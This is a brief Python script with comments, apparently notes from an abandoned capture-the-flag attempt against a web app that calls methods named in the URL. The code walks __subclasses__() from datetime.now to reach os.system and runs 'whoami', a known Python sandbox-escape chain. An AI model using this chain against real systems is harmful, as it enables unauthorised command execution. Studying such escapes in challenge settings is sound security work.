from datetime import datetime
for index, cls in enumerate(datetime.now.__class__.mro()[1].__subclasses__()):
    print(index, cls)

print(datetime.now.__class__.mro()[1].__subclasses__()[139].close.__globals__["system"]("whoami").__class__.bit_length)


# Server responds server: waitress header, so this probably is a python app.
# URL: https://ae8c01bf924c293e3d44b3d1.deadsec.quest/images/now
# now seems to be a method or function, after googling, this is a method under datetime.datetime
# Confirmed by calling other methods, all methods that doesn't require arguments work.

# https://ae8c01bf924c293e3d44b3d1.deadsec.quest/images/now.__class__.mro()[1].__subclasses__  => __subclasses__ is a method
# This is the farthest part I have got to.
# Server most probably only calls a method by string, not sure what to do if we need arguments.

# Give up on this.